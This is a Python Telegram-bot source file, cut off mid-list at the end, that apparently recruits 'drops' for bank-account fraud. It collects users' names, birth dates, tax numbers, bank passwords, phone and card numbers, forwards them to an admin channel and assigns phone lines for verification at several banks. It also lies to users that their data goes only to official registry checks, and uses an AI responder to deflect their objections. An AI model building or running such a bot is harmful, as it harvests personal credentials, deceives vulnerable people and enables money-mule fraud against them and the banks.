from aiogram import Router, F, Bot
from aiogram.filters import CommandStart, StateFilter
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove, FSInputFile, ReplyKeyboardMarkup, KeyboardButton, PhotoSize
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from bot.config import ADMIN_ID, BANK_TEMPLATES, get_template_photo
import bot.database as db
import re
import asyncio
import logging

logger = logging.getLogger(__name__)

router = Router()

class RegistrationStates(StatesGroup):
    waiting_pib_dob = State()
    waiting_ipn = State()
    waiting_confirm = State()
    waiting_phone = State()
    waiting_password = State()
    waiting_card_number = State()
    waiting_wrong_code_confirm = State()
    waiting_card_screenshot = State()
    waiting_own_number_confirm = State()
    waiting_amobank_instruction_confirm = State()
    waiting_lviv_success_confirm = State()

async def register_reg_msg(state: FSMContext, msg_id: int):
    data = await state.get_data()
    msg_ids = data.get("registration_msg_ids", [])
    if msg_id not in msg_ids:
        msg_ids.append(msg_id)
        await state.update_data(registration_msg_ids=msg_ids)

async def delete_reg_messages(chat_id: int, state: FSMContext, bot: Bot):
    data = await state.get_data()
    msg_ids = data.get("registration_msg_ids", [])
    for msg_id in msg_ids:
        try:
            await bot.delete_message(chat_id=chat_id, message_id=msg_id)
        except Exception:
            pass
    await state.update_data(registration_msg_ids=[])

def get_sms_request_keyboard() -> ReplyKeyboardRemove:
    return ReplyKeyboardRemove()

def get_cancel_keyboard() -> ReplyKeyboardRemove:
    return ReplyKeyboardRemove()

@router.message(F.text == "/id")
async def cmd_get_chat_id(message: Message):
    await message.answer(f"ID цього чату: <code>{message.chat.id}</code>", parse_mode="HTML")

@router.message(F.chat.type == "private", F.text == "❌ Скасувати")
async def handle_cancel_registration(message: Message, state: FSMContext):
    """Обробник скасування процесу введення анкетних даних"""
    client_id = message.from_user.id
    session = await db.get_session(client_id)
    if session and session['status'] in ('number_assigned', 'waiting_code'):
        return
        
    # Видаляємо всі повідомлення реєстрації
    await delete_reg_messages(message.chat.id, state, message.bot)
    try:
        await message.delete()
    except Exception:
        pass

    await state.clear()
    if session and session['status'] == 'registering':
        await db.set_session_status(client_id, 'completed')
    await message.answer(
        "Введення даних скасовано. Напишіть /start, щоб почати спочатку.",
        reply_markup=ReplyKeyboardRemove()
    )

def get_waiting_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="⏳ Очікування номера...")]],
        resize_keyboard=True,
        one_time_keyboard=False,
        is_persistent=True
    )

@router.message(F.chat.type == "private", F.text == "⏳ Очікування номера...")
async def handle_waiting_number_text(message: Message):
    """Обробник натискання кнопки очікування номера"""
    await message.answer("Будь ласка, зачекайте, поки адміністратор призначить вам номер телефону для початку верифікації.")

def clean_pib(pib: str) -> str:
    # Видаляємо допоміжні фрази на кшталт "дата народження", "д.н." тощо
    pib = re.sub(r'(?i)\b(дата\s+народження|д\.н\.|дн|народження|нар\.?|р\.н\.?)\b', '', pib)
    pib = re.sub(r'^[^\w\s]+|[^\w\s]+$', '', pib)
    pib = re.sub(r'\s+', ' ', pib)
    return pib.strip().title()

def is_image_completely_black(image_bytes: bytes) -> bool:
    try:
        from PIL import Image
        import io
        img = Image.open(io.BytesIO(image_bytes)).convert("L")
        extrema = img.getextrema()
        if extrema and len(extrema) == 2 and extrema[1] < 12:
            return True
    except Exception:
        pass
    return False

def is_no_screenshot_text(text: str) -> bool:
    if not text:
        return False
    t = text.lower().strip()
    
    phrases = [
        "не дає зробити скрін", "не дає скрін", "не робить скрін",
        "не можу зробити скрін", "не можу скрін", "не робить скрин",
        "заборонено зробити скрін", "заборонено скрін", "чорний скрін",
        "чорний екран", "не дає зробити скрин", "не дає скрин",
        "не можу зробити скрин", "не можу скрин", "не дає зробити фото",
        "не можу зробити фото", "не дає сфоткати", "не дозволяє зробити скрін",
        "не дозволяє зробити скрин", "блокує скрін", "блокує скрин",
        "не робить фото", "заборона скрін", "не можу скріншот", "не можу зробити скріншот",
        "не дає скріншот", "не дає зробити скріншот", "не дозволяє скріншот"
    ]
    
    for p in phrases:
        if p in t:
            return True
            
    no_words = ["не дає", "не можу", "не робить", "заборонено", "захист", "чорний", "не дозволяє", "блокує"]
    screen_words = ["скрін", "скрин", "фото", "знімок", "екран"]
    
    has_no = any(w in t for w in no_words)
    has_screen = any(w in t for w in screen_words)
    
    if has_no and has_screen:
        if "?" not in t:
            return True
            
    return False

@router.message(CommandStart(), F.chat.type == "private")
@router.message(F.chat.type == "private", F.text.in_({"Розпочати знову", "🔄 Розпочати знову"}))
async def cmd_start(message: Message, state: FSMContext):
    """Обробник команди /start для клієнта"""
    if message.from_user.id == ADMIN_ID:
        from bot.handlers.admin import get_admin_keyboard, clear_previous_admin_messages, register_admin_message
        msg = await message.answer(
            "Привіт, Адміне!\n\n"
            "Оберіть потрібну дію на клавіатурі нижче:",
            reply_markup=get_admin_keyboard()
        )
        if state:
            await clear_previous_admin_messages(message.chat.id, state, message.bot)
            try:
                await message.delete()
            except Exception:
                pass
            await register_admin_message(msg, state)
        return

    client_id = message.from_user.id
    existing_session = await db.get_session(client_id)

    if existing_session and existing_session['status'] in ('number_assigned', 'waiting_code'):
        await message.answer("Ваш запит вже обробляється або лінія активна. Будь ласка, очікуйте вказівок адміна.")
        return

    if existing_session and existing_session['status'] in ('registered', 'waiting_verification', 'verified'):
        # Якщо всі банки завершено (немає залишкових банків), дозволяємо розпочати нову сесію
        remaining_banks_str = existing_session.get('remaining_banks', '')
        remaining = [b for b in remaining_banks_str.split(",") if b]
        if remaining or not existing_session.get('selected_banks'):
            await message.answer(
                "Ваш запит на верифікацію вже прийнято і він очікує перевірки адміністратором. Будь ласка, очікуйте призначення номера телефону.",
                reply_markup=get_waiting_keyboard()
            )
            return

    await state.clear()
    username_db = message.from_user.username or "Немає юзернейму"
    await db.create_registering_session(client_id, username_db)
    await register_reg_msg(state, message.message_id)
    
    # Перевіряємо можливість автозаповнення з попередньої/поточної сесії
    if existing_session and existing_session['client_data']:
        ipn_match = re.search(r'ІПН:\s*(\d+)', existing_session['client_data'])
        pib_match = re.search(r'ПІБ:\s*(.+)', existing_session['client_data'])
        dob_match = re.search(r'Дата:\s*(.+)', existing_session['client_data'])
        
        if ipn_match and pib_match and dob_match:
            ipn = ipn_match.group(1)
            pib = pib_match.group(1)
            dob = dob_match.group(1)
            
            welcome_text = (
                f"Привіт! Знайдено ваші попередні дані верифікації:\n\n"
                f"• **ПІБ:** {pib}\n"
                f"• **Дата народження:** {dob}\n"
                f"• **ІПН:** {ipn}\n\n"
                f"Бажаєте використати ці дані для автозаповнення чи ввести нові дані (наприклад, для друга)?"
            )
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔄 Використати ці дані", callback_data="autofill_use")],
                [InlineKeyboardButton(text="✍️ Ввести нові дані", callback_data="autofill_new")]
            ])
            msg = await message.answer(welcome_text, reply_markup=keyboard, parse_mode="Markdown")
            await register_reg_msg(state, msg.message_id)
            await state.update_data(welcome_msg_ids=[msg.message_id], old_pib=pib, old_dob=dob, old_ipn=ipn)
            await state.set_state(RegistrationStates.waiting_pib_dob)
            return

    # Крок 1: Запитуємо ПІБ та Дату народження
    await db.update_session_client_phone(client_id, None)
    pib_msg = await message.answer(
        "Напишіть мені будь ласка Ваші\nПІБ та Дату Народження",
        reply_markup=get_cancel_keyboard()
    )
    await register_reg_msg(state, pib_msg.message_id)
    await state.update_data(pib_prompt_msg_id=pib_msg.message_id)
    await state.set_state(RegistrationStates.waiting_pib_dob)


@router.callback_query(F.data == "autofill_use")
async def handle_autofill_use(callback: CallbackQuery, state: FSMContext):
    """Обробник вибору використання попередніх даних"""
    state_data = await state.get_data()
    pib = state_data.get('old_pib')
    dob = state_data.get('old_dob')
    ipn = state_data.get('old_ipn')
    
    if not (pib and dob and ipn):
        await callback.answer("Не вдалося розпарсити старі дані.", show_alert=True)
        return
    
    # Зберігаємо дані в стан FSM
    await state.update_data(pib=pib, dob=dob, ipn=ipn)
    
    # Виводимо повідомлення підтвердження
    confirm_text = (
        f"Перевірте ваші дані:\n\n"
        f"ІПН: {ipn}\n"
        f"ПІБ: {pib}\n"
        f"Дата народження: {dob}"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Підтвердити та надіслати", callback_data="confirm_reg")],
        [InlineKeyboardButton(text="🔄 Заповнити заново", callback_data="restart_reg")]
    ])
    
    state_data = await state.get_data()
    welcome_msg_ids = state_data.get('welcome_msg_ids', [])
    for msg_id in welcome_msg_ids:
        try:
            await callback.bot.delete_message(chat_id=callback.message.chat.id, message_id=msg_id)
        except Exception:
            pass
    msg = await callback.message.answer(confirm_text, reply_markup=keyboard, parse_mode="Markdown")
    await register_reg_msg(state, msg.message_id)
    await state.set_state(RegistrationStates.waiting_confirm)
    await callback.answer()


@router.callback_query(F.data == "autofill_new")
async def handle_autofill_new(callback: CallbackQuery, state: FSMContext):
    """Обробник вибору ручного введення нових даних"""
    state_data = await state.get_data()
    welcome_msg_ids = state_data.get('welcome_msg_ids', [])
    await state.clear()
    await db.update_session_client_phone(callback.from_user.id, None)
    for msg_id in welcome_msg_ids:
        try:
            await callback.bot.delete_message(chat_id=callback.message.chat.id, message_id=msg_id)
        except Exception:
            pass
    pib_msg = await callback.message.answer(
        "Напишіть мені будь ласка Ваші\nПІБ та Дату Народження",
        reply_markup=get_cancel_keyboard()
    )
    await register_reg_msg(state, pib_msg.message_id)
    await state.update_data(pib_prompt_msg_id=pib_msg.message_id)
    await state.set_state(RegistrationStates.waiting_pib_dob)
    await callback.answer()

@router.message(RegistrationStates.waiting_pib_dob, F.chat.type == "private")
async def process_pib_dob(message: Message, state: FSMContext):
    """Отримання ПІБ та Дати народження (можна окремими повідомленнями)"""
    text = message.text.strip()
    state_data = await state.get_data()
    reg_chat_history = state_data.get('reg_chat_history', [])
    saved_pib = state_data.get('pib')
    saved_dob = state_data.get('dob')
    
    # 0. Перевіряємо наявність запитань / заперечень через ШІ
    if is_question_or_objection(text):
        await register_reg_msg(state, message.message_id)
        
        # Перевірка на спам
        support_count = state_data.get('support_requests_count', 0) + 1
        await state.update_data(support_requests_count=support_count)
        
        if support_count > 5:
            msg = await message.answer(
                "Перевищено ліміт запитань та помилок. Будь ласка, введіть коректні дані для реєстрації (ПІБ та Дату Народження). "
                "Якщо виникли труднощі — зверніться до адміністратора."
            )
            await register_reg_msg(state, msg.message_id)
            return
            
        await message.bot.send_chat_action(chat_id=message.chat.id, action="typing")
        from bot.openai_client import get_support_response
        response = await get_support_response(
            user_text=message.text,
            client_data="",
            current_bank_name=None,
            chat_history=reg_chat_history
        )
        msg = await message.answer(response)
        await register_reg_msg(state, msg.message_id)
        
        # Зберігаємо до історії
        reg_chat_history.append({"role": "user", "content": message.text})
        reg_chat_history.append({"role": "assistant", "content": response})
        await state.update_data(reg_chat_history=reg_chat_history)
        return
    
    await register_reg_msg(state, message.message_id)

    # Шукаємо дату народження
    date_match = re.search(r'\b(\d{1,2}[\.\-\/,]\d{1,2}[\.\-\/,]\d{2,4})\b', text)
    if not date_match:
        date_match = re.search(r'\b(\d{1,2}\s+\d{1,2}\s+\d{4})\b', text)
        
    dob = None
    if date_match:
        dob_raw = date_match.group(1)
        dob = parse_and_validate_date(dob_raw)
        if not dob:
            # Знайдено щось схоже на дату, але вона недійсна (наприклад, 73.41.1889)
            err_msg = await message.answer(
                "Некоректний формат або значення дати народження.\n"
                "Будь ласка, введіть реальну дату у форматі ДД.ММ.РРРР (наприклад: 15.08.1995):",
                reply_markup=get_cancel_keyboard()
            )
            await register_reg_msg(state, err_msg.message_id)
            await state.update_data(pib_prompt_msg_id=err_msg.message_id)
            return
        text_rest = text.replace(dob_raw, '').strip()
    else:
        text_rest = text

    pib = clean_pib(text_rest) if text_rest else ""

    progress_made = False

    # Оновлюємо значення
    if dob:
        saved_dob = dob
        await state.update_data(dob=dob, support_requests_count=0)
        progress_made = True
    if pib and is_valid_pib(pib):
        saved_pib = pib
        await state.update_data(pib=pib, support_requests_count=0)
        progress_made = True

    if not progress_made:
        # Введено не ПІБ і не дату
        support_count = state_data.get('support_requests_count', 0) + 1
        await state.update_data(support_requests_count=support_count)
        
        if support_count > 5:
            msg = await message.answer(
                "Перевищено ліміт запитань та помилок. Будь ласка, введіть коректні дані для реєстрації (ПІБ та Дату Народження). "
                "Якщо виникли труднощі — зверніться до адміністратора."
            )
            await register_reg_msg(state, msg.message_id)
            return
            
        # Підказуємо формат
        if saved_dob:
            err_msg = await message.answer(
                "Будь ласка, введіть Ваші справжні ПІБ (Прізвище, Ім'я, По Батькові):\n\n"
                "Приклад: Шевченко Тарас Григорович",
                reply_markup=get_cancel_keyboard()
            )
        elif saved_pib:
            err_msg = await message.answer(
                "Будь ласка, введіть Вашу дату народження:\n\n"
                "Приклад: 15.08.1995",
                reply_markup=get_cancel_keyboard()
            )
        else:
            err_msg = await message.answer(
                "Будь ласка, введіть Ваші справжні ПІБ та Дату Народження.\n\n"
                "Приклад: Шевченко Тарас Григорович 15.08.1995",
                reply_markup=get_cancel_keyboard()
            )
        await register_reg_msg(state, err_msg.message_id)
        return

    # Перевіряємо збір обох частин
    if saved_pib and saved_dob:
        client_data = f"ПІБ: {saved_pib}\nДата: {saved_dob}"
        await state.update_data(client_data=client_data)
        
        ipn_msg1 = await message.answer(
            "Будь ласка, напишіть Ваш ІПН (10 цифр):",
            reply_markup=get_cancel_keyboard()
        )
        ipn_msg2 = await message.answer(
            "Ми запитуємо ІПН, ПІБ та дату народження виключно для перевірки через офіційні державні реєстри:\n"
            "• щоб переконатися, що немає відкритих проваджень\n"
            "• щоб перевірити, чи не було раніше співпраці з нашою компанією\n\n"
            "*Важливо:*\n"
            "Ці дані використовуються тільки для внутрішньої перевірки і не передаються третім особам.",
            parse_mode="Markdown"
        )
        await register_reg_msg(state, ipn_msg1.message_id)
        await register_reg_msg(state, ipn_msg2.message_id)
        await state.update_data(ipn_prompt_msg_ids=[ipn_msg1.message_id, ipn_msg2.message_id])
        await state.set_state(RegistrationStates.waiting_ipn)
    elif saved_pib:
        err_msg = await message.answer(
            "Напишіть також вашу дату народження?",
            reply_markup=get_cancel_keyboard()
        )
        await register_reg_msg(state, err_msg.message_id)
        await state.update_data(pib_prompt_msg_id=err_msg.message_id)
    elif saved_dob:
        err_msg = await message.answer(
            "Напишіть також ваші ПІБ (Прізвище Ім'я По Батькові)?",
            reply_markup=get_cancel_keyboard()
        )
        await register_reg_msg(state, err_msg.message_id)
        await state.update_data(pib_prompt_msg_id=err_msg.message_id)
    else:
        err_msg = await message.answer(
            "Напишіть мені будь ласка Ваші\nПІБ та Дату Народження",
            reply_markup=get_cancel_keyboard()
        )
        await register_reg_msg(state, err_msg.message_id)
        await state.update_data(pib_prompt_msg_id=err_msg.message_id)


@router.message(RegistrationStates.waiting_ipn, F.chat.type == "private")
async def process_ipn(message: Message, state: FSMContext):
    """Отримання ІПН та перехід до підтвердження даних"""
    ipn = message.text.strip()
    state_data = await state.get_data()
    reg_chat_history = state_data.get('reg_chat_history', [])
    
    # 0. Перевіряємо наявність запитань / заперечень через ШІ
    if is_question_or_objection(ipn):
        await register_reg_msg(state, message.message_id)
        
        # Перевірка на спам
        support_count = state_data.get('support_requests_count', 0) + 1
        await state.update_data(support_requests_count=support_count)
        
        if support_count > 5:
            msg = await message.answer(
                "Перевищено ліміт запитань та помилок. Будь ласка, напишіть Ваш ІПН (10 цифр). "
                "Якщо виникли труднощі — зверніться до адміністратора."
            )
            await register_reg_msg(state, msg.message_id)
            return
            
        await message.bot.send_chat_action(chat_id=message.chat.id, action="typing")
        from bot.openai_client import get_support_response
        response = await get_support_response(
            user_text=message.text,
            client_data="",
            current_bank_name=None,
            chat_history=reg_chat_history
        )
        msg = await message.answer(response)
        await register_reg_msg(state, msg.message_id)
        
        # Зберігаємо до історії
        reg_chat_history.append({"role": "user", "content": message.text})
        reg_chat_history.append({"role": "assistant", "content": response})
        await state.update_data(reg_chat_history=reg_chat_history)
        return
    
    await register_reg_msg(state, message.message_id)
    state_data = await state.get_data()

    if not ipn.isdigit() or len(ipn) != 10:
        err_msg = await message.answer("ІПН має складатися рівно з 10 цифр. Будь ласка, перевірте та спробуйте ще раз:")
        await state.update_data(ipn_prompt_msg_ids=[err_msg.message_id])
        return

    await state.update_data(ipn=ipn)
    data = await state.get_data()
    pib = data['pib']
    dob = data['dob']
    
    # Виводимо повідомлення підтвердження
    confirm_text = (
        f"Перевірте ваші дані:\n\n"
        f"ІПН: {ipn}\n"
        f"ПІБ: {pib}\n"
        f"Дата народження: {dob}"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Підтвердити та надіслати", callback_data="confirm_reg")],
        [InlineKeyboardButton(text="🔄 Заповнити заново", callback_data="restart_reg")]
    ])
    
    msg = await message.answer(confirm_text, reply_markup=keyboard, parse_mode="Markdown")
    await register_reg_msg(state, msg.message_id)
    await state.set_state(RegistrationStates.waiting_confirm)

@router.callback_query(F.data == "confirm_reg")
async def handle_confirm_reg(callback: CallbackQuery, state: FSMContext, bot: Bot):
    """Обробник підтвердження реєстраційних даних"""
    current_state = await state.get_state()
    if current_state != RegistrationStates.waiting_confirm:
        await callback.answer("Сесія реєстрації застаріла або вже підтверджена.", show_alert=True)
        return

    data = await state.get_data()
    pib = data.get('pib')
    dob = data.get('dob')
    ipn = data.get('ipn')
    
    if not pib or not dob or not ipn:
        await callback.answer("Дані не знайдено. Будь ласка, почніть спочатку з /start.", show_alert=True)
        await callback.message.edit_reply_markup(reply_markup=None)
        await state.clear()
        return

    # Видаляємо всі повідомлення процесу реєстрації (до очищення стану!)
    await delete_reg_messages(callback.message.chat.id, state, callback.bot)

    await state.clear()

    # Формуємо дані для адмін-панелі та Telegram повідомлення
    client_data = f"ІПН: {ipn}\nПІБ: {pib}\nДата: {dob}"
    username = callback.from_user.username
    if username:
        client_data += f"\n\nДроп - @{username}"
        
    client_id = callback.from_user.id
    username_db = username or "Немає юзернейму"


    # Створюємо нову сесію в базі даних
    await db.create_or_update_session(client_id, username_db, client_data)
        
    msg = await callback.message.answer(
        "Зачекайте будь ласка кілька хвилин",
        reply_markup=get_waiting_keyboard()
    )
    await db.update_session_waiting_message_id(client_id, msg.message_id)
    await callback.answer("Дані підтверджено!")

    # Отримуємо унікальні назви банків для вибору адміном
    unique_banks_db = await db.get_unique_banks()
    custom_order = ["bank.kd", "IziBank", "Alliance", "LvivBank", "AmoBank"]
    all_banks = list(dict.fromkeys(custom_order + unique_banks_db))
    
    warning_text = ""
    if not unique_banks_db:
        warning_text = "\n\n⚠️ *Попередження:* немає доступних ліній/номерів у базі! Додайте номери через сайт або в чат."
        
    # Отримуємо історію верифікацій клієнта
    history = await db.get_client_verification_history(client_id)
    passed_banks = {h['bank'] for h in history if h['status'] == 'success'}
    banned_banks = {h['bank'] for h in history if h['status'] in ('banned', 'failure')}

    # Створюємо кнопки вибору банків
    keyboard_buttons = []
    row = []
    for bank in all_banks:
        suffix = ""
        if bank in passed_banks:
            suffix = " (✅ Пройдено)"
        elif bank in banned_banks:
            suffix = " (❌ Бан)"
        button_text = f"[ ] {bank}{suffix}"
        callback_data = f"toggle_{client_id}_{bank}"
        row.append(InlineKeyboardButton(text=button_text, callback_data=callback_data))
        if len(row) == 2:
            keyboard_buttons.append(row)
            row = []
    if row:
        keyboard_buttons.append(row)
        
    # Додаємо керівні кнопки
    keyboard_buttons.append([InlineKeyboardButton(text="Зберегти та продовжити", callback_data=f"savebanks_{client_id}")])
    keyboard_buttons.append([InlineKeyboardButton(text="Відхилити запит", callback_data=f"reject_{client_id}")])
    
    markup = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
    
    # Сповіщаємо адміна в Telegram
    admin_msg = (
        f"Новий клієнт на верифікацію!\n"
        f"• Telegram: @{username} (ID: {client_id})\n"
        f"• Дані:\n```\n{client_data}\n```\n"
        f"Оберіть банки, які має пройти клієнт:{warning_text}"
    )
    
    await bot.send_message(chat_id=ADMIN_ID, text=admin_msg, reply_markup=markup, parse_mode="Markdown")

@router.callback_query(F.data == "restart_reg")
async def handle_restart_reg(callback: CallbackQuery, state: FSMContext):
    """Обробник скасування та заповнення анкети заново"""
    current_state = await state.get_state()
    if current_state != RegistrationStates.waiting_confirm:
        await callback.answer("Сесія реєстрації застаріла.", show_alert=True)
        return
        
    await state.clear()
    try:
        await callback.message.delete()
    except Exception:
        await callback.message.edit_reply_markup(reply_markup=None)
    pib_msg = await callback.message.answer(
        "Напишіть мені будь ласка Ваші\nПІБ та Дату Народження",
        reply_markup=get_cancel_keyboard()
    )
    await register_reg_msg(state, pib_msg.message_id)
    await state.update_data(pib_prompt_msg_id=pib_msg.message_id)
    await state.set_state(RegistrationStates.waiting_pib_dob)
    await callback.answer("Почнемо заново!")


@router.message(RegistrationStates.waiting_password, F.chat.type == "private")
async def process_client_password(message: Message, state: FSMContext):
    password = message.text.strip()
    await state.update_data(client_password=password)
    
    # Перевіряємо поточний банк у сесії
    client_id = message.from_user.id
    session = await db.get_session(client_id)
    bank_name = ""
    if session and session['line_id']:
        line_info = await db.get_line(session['line_id'])
        if line_info:
            bank_name = line_info['bank'].strip().lower()

    if session and session.get('client_phone'):
        # Якщо в базі вже є збережений номер, просто використовуємо його
        await continue_after_phone(message, state, message.bot, client_id)
        return

    if bank_name == "bank.kd":
        # Для bank.kd не просимо скріншот з меню картки та повний номер картки
        # Після пароля запитуємо номер телефону
        await message.answer("Будь ласка, напишіть Ваш номер телефону?")
        await state.set_state(RegistrationStates.waiting_phone)
    else:
        # Для інших банків теж запитуємо номер телефону після пароля
        await message.answer("Будь ласка, напишіть Ваш номер телефону?")
        await state.set_state(RegistrationStates.waiting_phone)


@router.message(RegistrationStates.waiting_phone, F.chat.type == "private")
async def process_client_phone(message: Message, state: FSMContext, bot: Bot):
    text = message.text.strip()
    client_id = message.from_user.id
    
    session = await db.get_session(client_id)
    if not session:
        await message.answer("Помилка: сесія не знайдена. Спробуйте /start.")
        await state.clear()
        return

    # Використовуємо ШІ для обробки відповіді про номер телефону
    from bot.openai_client import get_support_response
    response = await get_support_response(
        user_text=text,
        client_data=session.get('client_data', ''),
        current_bank_name="номер телефону"
    )
    
    # Перевіряємо чи ШІ розпізнав номер телефону
    phone_match = re.search(r'\[PHONE:\s*([+\d\s\(\)]{9,20})\]', response)
    if phone_match:
        phone_number = phone_match.group(1).strip()
        # Зберігаємо номер телефону в сесію
        await db.update_session_client_phone(client_id, phone_number)
        
        # Переходимо до наступного кроку
        await message.answer("Дякую! Номер телефону прийнято.")
        await continue_after_phone(message, state, bot, client_id)
    else:
        # Перевіряємо, чи клієнт відмовився надавати телефон
        if "[REFUSED_PHONE]" in response:
            username = message.from_user.username or "Немає юзернейму"
            try:
                await bot.send_message(
                    chat_id=ADMIN_ID,
                    text=f"⚠️ <b>Увага!</b> Клієнт @{username} (ID: {client_id}) відмовився надавати номер телефону.\nПовідомлення клієнта: <i>{text}</i>",
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.error(f"Не вдалося надіслати сповіщення адміну про відмову телефону: {e}")
        
        # Якщо ШІ не розпізнав номер, просимо повторити (надсилаємо відповідь ШІ)
        clean_text = re.sub(r'\[[^\]]+\]', '', response).strip()
        await message.answer(clean_text or "Будь ласка, надішліть коректний номер телефону.")

async def continue_after_phone(message: Message, state: FSMContext, bot: Bot, client_id: int):
    """Продовження після отримання номера телефону"""
    data = await state.get_data()
    client_password = data.get('client_password')
    success_photo_id = data.get('success_photo_id') or data.get('last_photo_id')
    card_photo_id = data.get('card_photo_id')
    client_card = data.get('client_card')
    
    session = await db.get_session(client_id)
    if not session:
        await message.answer("Помилка: сесія не знайдена. Спробуйте /start.")
        await state.clear()
        return

    await state.clear()

    # Розпарсимо PIB, DOB, IPN з client_data
    ipn_match = re.search(r'ІПН:\s*(\d+)', session['client_data'])
    pib_match = re.search(r'ПІБ:\s*(.+)', session['client_data'])
    dob_match = re.search(r'Дата:\s*(.+)', session['client_data'])
    
    ipn = ipn_match.group(1) if ipn_match else "Невідомо"
    pib = pib_match.group(1) if pib_match else "Невідомо"
    dob = dob_match.group(1) if dob_match else "Невідомо"
    
    # Інформація про лінію
    line_id = session['line_id']
    line_str = "Не призначено"
    bank_name = "Банк"
    if line_id:
        line_info = await db.get_line(line_id)
        if line_info:
            line_str = f"Line {line_info['line_id']} Return: {line_info['phone_number']} | {line_info['bank']}"
            bank_name = line_info['bank']

    # Формуємо анкету без "РЕЄСТРАЦІЙНІ ДАНІ"
    phone_number = session.get('client_phone', text if 'text' in locals() else '')
    anketa_text = (
        f"ІПН: {ipn}\n"
        f"ПІБ: {pib}\n"
        f"Дата: {dob}\n"
        f"Телефон: {phone_number}\n\n"
    )
    
    username = message.from_user.username
    if username:
        anketa_text += f"Дроп - @{username}\n\n"
        
    anketa_text += f"{line_str}\n\n"
    
    if client_card:
        anketa_text += f"Номер карти: {client_card}\n\n"
        
    if client_password:
        anketa_text += f"{client_password}"
        
    anketa_text = anketa_text.strip()
    
    from bot.config import get_anketa_chat_id, get_admin_id
    target_chat = get_anketa_chat_id() or get_admin_id()
    
    try:
        is_bank_kd = bank_name and "bank.kd" in bank_name.lower()
        if success_photo_id and card_photo_id and is_bank_kd:
            from aiogram.types import InputMediaPhoto
            media = [
                InputMediaPhoto(media=success_photo_id, caption=anketa_text),
                InputMediaPhoto(media=card_photo_id)
            ]
            await bot.send_media_group(
                chat_id=target_chat,
                media=media
            )
        elif success_photo_id:
            await bot.send_photo(
                chat_id=target_chat,
                photo=success_photo_id,
                caption=anketa_text
            )
        else:
            await bot.send_message(
                chat_id=target_chat,
                text=anketa_text
            )
    except Exception as e:
        print(f"Помилка відправки анкети: {e}")
        try:
            await bot.send_message(
                chat_id=ADMIN_ID,
                text=f"Помилка відправки анкети в канал. Анкета:\n\n{anketa_text}"
            )
        except Exception:
            pass

    # Закриваємо поточний банк у сесії
    if line_id:
        await db.set_line_status(line_id, 'success')
        await db.log_verification_end(client_id, bank_name, 'success')
        
        import aiosqlite
        from bot.config import DB_FILE
        async with aiosqlite.connect(DB_FILE) as db_conn:
            await db_conn.execute("UPDATE sessions SET line_id = NULL, client_message_id = NULL, status = 'registered' WHERE client_id = ?", (client_id,))
            await db_conn.commit()

    remaining_banks_str = session['remaining_banks']
    remaining = remaining_banks_str.split(",") if remaining_banks_str else []
    if bank_name in remaining:
        remaining.remove(bank_name)

    new_remaining_str = ",".join(remaining)
    await db.update_session_banks(client_id, session['selected_banks'], new_remaining_str)

    if not remaining:
        kbd = ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="🔄 Розпочати знову")]
            ],
            resize_keyboard=True,
            one_time_keyboard=False,
            is_persistent=True
        )
        await message.answer(
            "Роботу завершили, дякуємо за співпрацю.",
            reply_markup=kbd
        )
        # Сесію НЕ закриваємо автоматично, щоб адмін закрив її вручну по кнопці
        # await db.close_session(client_id)
        
        try:
            await bot.send_message(
                chat_id=ADMIN_ID,
                text=f"Верифікацію для клієнта @{username or client_id} успішно завершено по всіх банках! Анкета надіслана."
            )
        except Exception:
            pass
    else:
        await message.answer(
            f"Верифікацію для банку {bank_name} завершено. Очікуйте наступний номер.",
            reply_markup=ReplyKeyboardRemove()
        )
        
        try:
            await bot.send_message(
                chat_id=ADMIN_ID,
                text=f"Клієнт @{username or client_id} пройшов банк {bank_name}. Анкета надіслана. Очікує на наступний банк."
            )
        except Exception:
            pass


@router.message(F.chat.type == "private", F.text & F.text.startswith('/'))
async def handle_custom_bank_commands(message: Message):
    """Обробник кастомних команд завантаження додатків та інструкцій реєстрації"""
    cmd = message.text.strip().lower()
    
    # Інструкції реєстрації, які використовуються додатково
    manual_instructions = {
        "/екорег": "Анкетні дані в самому ЕкоБанку виставляти як на фото! Слово п...",
        "/аморег": "Анкетні дані в самому АмоБанку виставляти як на фото..."
    }
    
    if cmd in manual_instructions:
        photo_path = get_template_photo(cmd)
        if photo_path:
            await message.answer_photo(photo=FSInputFile(photo_path), caption=manual_instructions[cmd])
        else:
            await message.answer(manual_instructions[cmd])
        return

    # Перевіряємо по словнику BANK_TEMPLATES
    for key, val in BANK_TEMPLATES.items():
        if val['command'].lower() == cmd:
            photo_path = get_template_photo(key)
            if photo_path:
                await message.answer_photo(photo=FSInputFile(photo_path), caption=val['text'])
            else:
                await message.answer(val['text'])
            return

def is_wrong_code_text(text: str, chat_history: list = None) -> bool:
    t = text.lower().strip()
    t = re.sub(r'\s+', ' ', t)
    
    # Якщо згадується слово, пароль, пін або прізвище, це стосується пароля/кодового слова, а не SMS-коду
    ignore_keywords = ["слово", "пароль", "пін", "пин", "прізвищ", "фамил", "пошт", "емейл", "email"]
    for ikw in ignore_keywords:
        if ikw in t:
            return False
            
    # Перевіряємо контекст попереднього повідомлення бота
    if chat_history:
        last_assistant_msg = None
        for msg in reversed(chat_history):
            if msg.get("role") == "assistant":
                last_assistant_msg = msg.get("content", "").lower()
                break
        
        if last_assistant_msg:
            # Якщо останнє повідомлення бота було про секретне слово, пароль тощо:
            if any(ckw in last_assistant_msg for ckw in ignore_keywords):
                # Додатково перевіряємо, чи повідомлення є коротким (до 3 слів, наприклад "не підходить", "не працює")
                if len(t.split()) <= 3:
                    return False
    
    # Ключові слова/фрази для некоректного коду
    keywords = [
        # Українські версії та діалекти
        "не підійшов", "не підійш", "не підход", "не підіш", "не підойш", "не подіш",
        "не працює", "не працю", "не робить", "не робе",
        
        # Російські версії, суржик та друкарські помилки (як-от "падашов", "подишов")
        "не подошел", "не подош", "не подхо", "не подиш", "не пидиш",
